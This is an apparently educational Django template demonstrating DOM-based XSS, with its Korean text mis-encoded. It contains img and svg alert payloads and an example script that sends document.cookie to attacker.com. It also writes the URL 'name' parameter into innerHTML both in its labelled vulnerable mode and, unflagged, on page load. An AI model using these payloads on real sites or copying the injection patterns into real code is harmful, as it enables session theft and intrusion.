<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DOM-based XSS í…ŒìŠ¤íŠ¸</title>
  {% load static %}
  <link rel="stylesheet" href="{% static 'css/common.css' %}">
  <link rel="stylesheet" href="{% static 'css/test-pages.css' %}">
</head>
<body>
  <div class="container">
    <h1>ğŸŒ DOM-based XSS í…ŒìŠ¤íŠ¸</h1>

    <div class="description">
      <strong>ğŸ“– DOM-based XSSë€?</strong><br>
      ì„œë²„ë¥¼ ê±°ì¹˜ì§€ ì•Šê³  í´ë¼ì´ì–¸íŠ¸(ë¸Œë¼ìš°ì €)ì˜ JavaScriptì—ì„œ URL íŒŒë¼ë¯¸í„°ë¥¼ ì§ì ‘ DOMì— ì‚½ì…í•  ë•Œ ë°œìƒí•˜ëŠ” XSS ê³µê²©ì…ë‹ˆë‹¤.
      ì„œë²„ ë¡œê·¸ì—ë„ ë‚¨ì§€ ì•Šì•„ íƒì§€ê°€ ì–´ë µìŠµë‹ˆë‹¤.
    </div>

    <div class="mode-selector">
      <p><strong>í…ŒìŠ¤íŠ¸ ëª¨ë“œë¥¼ ì„ íƒí•˜ì„¸ìš”:</strong></p>
      <button class="mode-btn vulnerable-btn" onclick="setMode('vulnerable')">
        âŒ ì·¨ì•½ì½”ë“œ (innerHTML)
      </button>
      <button class="mode-btn safe-btn" onclick="setMode('safe')">
        âœ… ì•ˆì „ì½”ë“œ (textContent)
      </button>
    </div>

    <div class="info-box">
      <strong>ğŸ“ í…ŒìŠ¤íŠ¸ ë°©ë²•:</strong><br>
      ì•„ë˜ ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ë¹ ë¥´ê²Œ í…ŒìŠ¤íŠ¸í•˜ê±°ë‚˜, URLì— ì§ì ‘ name íŒŒë¼ë¯¸í„°ë¥¼ ì¶”ê°€í•˜ì„¸ìš”

      <div style="margin: 15px 0; padding: 15px; background: white; border-radius: 5px; border: 2px solid #2196F3;">
        <strong>ğŸš€ ë¹ ë¥¸ í…ŒìŠ¤íŠ¸:</strong><br><br>

        <a href="?name=í™ê¸¸ë™" style="display: inline-block; padding: 10px 20px; background: #4CAF50; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
          âœ… ì •ìƒ ì…ë ¥
        </a>

        <a href="?name=<img src=x onerror=alert('XSS ê³µê²©!')>" style="display: inline-block; padding: 10px 20px; background: #f44336; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
          âŒ IMG XSS
        </a>

        <a href="?name=<svg onload=alert('SVG XSS!')>" style="display: inline-block; padding: 10px 20px; background: #f44336; color: white; border-radius: 5px; text-decoration: none; margin: 5px; font-weight: bold;">
          âŒ SVG XSS
        </a>

        <p style="margin-top: 10px; color: #666; font-size: 14px;">
          ğŸ’¡ ë§í¬ë¥¼ í´ë¦­í•œ í›„ ìœ„ì˜ <strong>"ì·¨ì•½ì½”ë“œ"</strong> ë˜ëŠ” <strong>"ì•ˆì „ì½”ë“œ"</strong> ë²„íŠ¼ì„ ëˆŒëŸ¬ë³´ì„¸ìš”!
        </p>
      </div>
    </div>

    <div class="result-box">
      <h3>ğŸ“Š ì‹¤í–‰ ê²°ê³¼</h3>

      <!-- í˜„ì¬ URL í‘œì‹œ -->
      <p><strong>í˜„ì¬ URL:</strong></p>
      <div class="code" style="margin-bottom: 15px;">
        <div id="current-url-encoded" style="word-break: break-all; color: #666;"></div>
      </div>

      <p><strong>ë””ì½”ë”©ëœ URL:</strong></p>
      <div class="code" style="margin-bottom: 20px;">
        <div id="current-url-decoded" style="word-break: break-all;"></div>
      </div>

      <!-- ì‹¤í–‰ ê²°ê³¼ -->
      <p><strong>ê²°ê³¼:</strong></p>
      <div id="greeting" style="padding: 20px; background: #fff; border: 2px solid #2196F3; border-radius: 8px; min-height: 80px; font-size: 16px;">
        <div style="color: #999; text-align: center; padding: 20px;">
          âœ¨ URLì— name íŒŒë¼ë¯¸í„°ë¥¼ ì¶”ê°€í•œ í›„<br>
          ìœ„ì˜ <strong>"ì·¨ì•½ì½”ë“œ"</strong> ë˜ëŠ” <strong>"ì•ˆì „ì½”ë“œ"</strong> ë²„íŠ¼ì„ ëˆŒëŸ¬ë³´ì„¸ìš”!
        </div>
      </div>
    </div>

    <div class="attack-example">
      <h3>ğŸ¯ ê³µê²© ì˜ˆì œ</h3>
      <p><strong>ì •ìƒ URL:</strong></p>
      <div class="code">
        ?name=í™ê¸¸ë™
      </div>
      <p><strong>ì•…ì˜ì  URL:</strong></p>
      <div class="code">
        ?name=&lt;img src=x onerror=alert('XSS')&gt;<br>
        ?name=&lt;script&gt;document.location='http://attacker.com?cookie='+document.cookie&lt;/script&gt;
      </div>

      <h4>ğŸ’¡ ì·¨ì•½í•œ ì½”ë“œ vs ì•ˆì „í•œ ì½”ë“œ</h4>
      <div class="code">
        // âŒ ì·¨ì•½ (innerHTML ì‚¬ìš©)<br>
        element.innerHTML = "ì•ˆë…•í•˜ì„¸ìš”, " + name + "ë‹˜!";<br>
        // HTML íƒœê·¸ê°€ íŒŒì‹±ë˜ì–´ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰<br>
        <br>
        // âœ… ì•ˆì „ (textContent ì‚¬ìš©)<br>
        element.textContent = "ì•ˆë…•í•˜ì„¸ìš”, " + name + "ë‹˜!";<br>
        // ëª¨ë“  ì…ë ¥ì„ í…ìŠ¤íŠ¸ë¡œë§Œ ì²˜ë¦¬
      </div>
    </div>

    <div class="links">
      <a href="{% url 'index' %}">ğŸ  ë©”ì¸ìœ¼ë¡œ</a>
    </div>
  </div>

  <script>
    let currentMode = null;

    // í˜„ì¬ URL í‘œì‹œ (ì¸ì½”ë”© + ë””ì½”ë”©)
    function updateCurrentURL() {
      // ì¸ì½”ë”©ëœ URL (ì›ë³¸)
      document.getElementById('current-url-encoded').textContent = window.location.href;

      // ë””ì½”ë”©ëœ URL
      try {
        const decodedURL = decodeURIComponent(window.location.href);
        document.getElementById('current-url-decoded').textContent = decodedURL;
      } catch (e) {
        document.getElementById('current-url-decoded').textContent = window.location.href;
      }
    }

    function setMode(mode) {
      currentMode = mode;

      // ë²„íŠ¼ í™œì„±í™” í‘œì‹œ
      document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.classList.remove('active');
      });
      event.target.classList.add('active');

      // URLì—ì„œ name íŒŒë¼ë¯¸í„° ê°€ì ¸ì˜¤ê¸°
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name") || "ì†ë‹˜";

      const greetingElement = document.getElementById("greeting");

      if (mode === 'vulnerable') {
        // âŒ ì·¨ì•½í•œ ì½”ë“œ - innerHTML ì‚¬ìš©
        greetingElement.innerHTML =
          '<div style="padding: 10px; background: #ffebee; border-left: 4px solid #f44336; border-radius: 5px;">' +
          '<strong style="color: #c62828;">âŒ ì·¨ì•½ ëª¨ë“œ ì‹¤í–‰</strong><br><br>' +
          '<div style="font-size: 18px; color: #333;">ì•ˆë…•í•˜ì„¸ìš”, ' + name + 'ë‹˜!</div>' +
          '</div>';
      } else {
        // âœ… ì•ˆì „í•œ ì½”ë“œ - textContent ì‚¬ìš©
        const safeDiv = document.createElement('div');
        safeDiv.style.cssText = 'padding: 10px; background: #e8f5e9; border-left: 4px solid #4caf50; border-radius: 5px;';

        const modeText = document.createElement('strong');
        modeText.style.color = '#2e7d32';
        modeText.textContent = 'âœ… ì•ˆì „ ëª¨ë“œ ì‹¤í–‰';

        const br1 = document.createElement('br');
        const br2 = document.createElement('br');

        const greetingText = document.createElement('div');
        greetingText.style.cssText = 'font-size: 18px; color: #333;';
        greetingText.textContent = 'ì•ˆë…•í•˜ì„¸ìš”, ' + name + 'ë‹˜!';

        safeDiv.appendChild(modeText);
        safeDiv.appendChild(br1);
        safeDiv.appendChild(br2);
        safeDiv.appendChild(greetingText);

        greetingElement.innerHTML = '';
        greetingElement.appendChild(safeDiv);
      }
    }

    // í˜ì´ì§€ ë¡œë“œ ì‹œ URL í‘œì‹œ ë° name í™•ì¸
    window.addEventListener('DOMContentLoaded', () => {
      updateCurrentURL();

      const params = new URLSearchParams(window.location.search);
      if (params.has('name')) {
        const name = params.get('name');
        document.getElementById('greeting').innerHTML =
          '<em style="color: #999;">âœ… URLì— name íŒŒë¼ë¯¸í„°ê°€ ìˆìŠµë‹ˆë‹¤: <strong>' +
          name.substring(0, 50) + (name.length > 50 ? '...' : '') +
          '</strong><br>ìœ„ì˜ ë²„íŠ¼ì„ ëˆŒëŸ¬ ì·¨ì•½/ì•ˆì „ ì½”ë“œì˜ ì°¨ì´ë¥¼ í™•ì¸í•˜ì„¸ìš”!</em>';
      }
    });
  </script>
</body>
</html>